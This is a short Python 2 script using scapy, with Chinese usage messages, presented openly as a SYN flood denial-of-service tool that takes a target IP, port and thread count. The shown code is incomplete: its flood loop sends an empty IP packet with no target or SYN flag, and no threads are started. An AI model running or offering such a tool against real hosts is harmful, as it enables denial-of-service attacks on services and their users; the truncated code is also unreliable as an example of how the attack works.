#synFlood.py
#!/usr/bin/python
	# -*- coding:utf-8 -*-
	from scapy.all import *
	from time import sleep
	import thread
	import random
	import logging
	logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

	if len(sys.argv) !=4:
		print "用法： ./syn_flood.py [ip地址] [端口] [线程数]"
		print "举例： ./syn_flood.py 1.1.1.1 80 20"
		sys.exit()

	target = str(sys.argv[1])
	port = int(sys.argv[2])
	threads = int(sys.argv[3])

	print "正在执行 SYN flood 攻击，按ctrl+c停止攻击"
	def synflood(target,port):
		while 0==0:
			x = random.randint(0,65535)
			send(IP())
